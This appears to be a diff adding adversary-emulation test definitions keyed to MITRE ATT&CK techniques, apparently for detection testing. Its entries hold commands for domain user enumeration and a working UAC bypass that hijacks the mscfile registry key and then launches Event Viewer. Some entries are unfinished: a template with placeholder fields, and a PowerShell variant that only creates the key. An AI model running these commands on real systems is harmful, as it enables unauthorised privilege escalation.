@@ -1,0 +1,20 @@
+attack_technique: Txxxx.xx1
+display_name: your name which you want! (cmd)
+simple_description: Simple Description for some Techniques/Attacks Detected by You
+type: command_prompt
+commands: cmd.exe /c net user /domain
+commands: cmd.exe /c net users
+
+attack_technique: T1548.002
+display_name: Bypass UAC using Event Viewer (cmd)
+simple_description: Abuse Elevation Control Mechanism: Bypass User Access Control
+type: command_prompt
+commands: cmd.exe /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "cmd.exe" /f
+commands: cmd.exe /c eventvwr.msc
+
+attack_technique: T1548.xx?
+display_name: Bypass UAC using Event Viewer (PowerShell)
+simple_description: Abuse Elevation Control Mechanism: Bypass User Access Control
+type: powershell
+commands: powershell New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
+commands: cmd.exe /c powershell New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
